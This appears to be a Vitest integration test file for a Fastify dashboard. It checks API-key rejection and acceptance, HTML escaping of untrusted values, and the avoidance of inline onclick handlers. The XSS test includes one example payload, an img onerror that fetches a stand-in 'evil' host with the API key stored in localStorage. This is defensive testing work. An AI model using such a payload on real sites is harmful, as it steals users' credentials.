import { describe, it, expect, afterAll, beforeAll } from 'vitest';
import type { FastifyInstance } from 'fastify';
import { createServer } from '../server.js';

const API_KEY = 'test-api-key'; // matches vitest.integration.config.ts

describe('dashboard', () => {
  let app: FastifyInstance;

  beforeAll(async () => {
    app = await createServer();
  });

  afterAll(async () => {
    await app.close();
  });

  describe('GET /api/v1/import-status', () => {
    const get = (headers: Record<string, string> = {}) =>
      app.inject({ method: 'GET', url: '/api/v1/import-status', headers });

    it('rejects a request with no API key', async () => {
      expect((await get()).statusCode).toBe(401);
    });

    it('rejects a wrong API key', async () => {
      expect((await get({ 'x-api-key': 'wrong' })).statusCode).toBe(401);
    });

    it('rejects a duplicated header, which arrives as an array rather than a string', async () => {
      const res = await app.inject({
        method: 'GET',
        url: '/api/v1/import-status',
        headers: { 'x-api-key': [API_KEY, 'wrong'] as unknown as string },
      });
      expect(res.statusCode).toBe(401);
    });

    it('accepts the configured API key', async () => {
      expect((await get({ 'x-api-key': API_KEY })).statusCode).toBe(200);
    });
  });

  describe('GET /dashboard', () => {
    it('serves the HTML shell without an API key', async () => {
      const res = await app.inject({ method: 'GET', url: '/dashboard' });
      expect(res.statusCode).toBe(200);
      expect(res.headers['content-type']).toContain('text/html');
    });

    it('escapes values that reach innerHTML', async () => {
      // The dashboard renders values it does not control: OSV ecosystem names
      // come from upstream data, and errorMessage is whatever a failing fetcher
      // produced. Both are interpolated into innerHTML, and the API key lives
      // in localStorage, so an injected script would be able to read it.
      // esc() is defined inside the page's own <script>, so this exercises the
      // shipped implementation rather than a copy of it.
      const html = (await app.inject({ method: 'GET', url: '/dashboard' })).body;
      const escSource = html.match(/function esc\(v\) \{[\s\S]*?\n {4}\}/)?.[0];
      expect(escSource, 'esc() must exist in the served page').toBeDefined();

      const esc = new Function(`${escSource}; return esc;`)() as (v: unknown) => string;
      const payload = `<img src=x onerror="fetch('//evil/'+localStorage.getItem('heretix_api_key'))">`;
      const escaped = esc(payload);

      expect(escaped).not.toMatch(/[<>]/);
      expect(escaped).not.toMatch(/["']/);
      expect(esc(null)).toBe('');
    });

    it('does not build click handlers by interpolating data into onclick attributes', async () => {
      // Job sources are interpolated into the action buttons; inside an
      // onclick they would sit in an HTML-attribute *and* a JS-string context
      // at once. Data attributes plus delegation leave only the former.
      const html = (await app.inject({ method: 'GET', url: '/dashboard' })).body;
      expect(html).not.toMatch(/onclick="runJob/);
      expect(html).not.toMatch(/onclick="toggleJob/);
      expect(html).toContain('data-action="run"');
      expect(html).toContain('data-action="toggle"');
    });
  });
});
